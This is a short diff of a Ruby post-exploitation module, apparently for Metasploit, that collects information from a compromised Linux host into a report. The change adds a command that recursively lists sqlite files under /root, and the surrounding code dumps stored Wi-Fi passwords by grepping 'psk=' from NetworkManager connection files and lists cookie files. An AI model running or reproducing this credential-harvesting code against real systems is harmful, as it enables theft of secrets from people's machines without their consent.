@@ -240,9 +240,9 @@ def run
         data_dump << "Target gateway      : #{gateway}\n"
         data_dump << "Payload directory   : #{payload_path}\n"
         data_dump << "Client UID          : #{target_uid}\n"
+        data_dump << "Distro description  : #{distro_description}\n"
         data_dump << "Operative System    : #{sys_info['OS']}\n"
         data_dump << "Distro uname        : #{distro_uname}\n"
-        data_dump << "Distro description  : #{distro_description}\n"
         data_dump << "\n\n\n"
         data_dump << "FILE SYSTEM\n"
         data_dump << "------------\n"
@@ -331,6 +331,7 @@ def run
           #
           # bash commands to be executed remotelly ..
           #
+          list_sqlite = cmd_exec("ls -a -R /root | grep \"sqlite\"")
           list_cookies = cmd_exec("ls /usr/share/pyshared/mechanize | grep \"cookie\"")
           # Dump target WIFI credentials stored ..
           wpa_out = cmd_exec("grep psk= /etc/NetworkManager/system-connections/*")
@@ -367,6 +368,8 @@ def run
             data_dump << "LIST COOKIES   :\n"
             data_dump << "----------------\n"
             data_dump << list_cookies
+            data_dump << "\n\n"
+            data_dump << list_sqlite
             data_dump << "\n\n"
         end
 
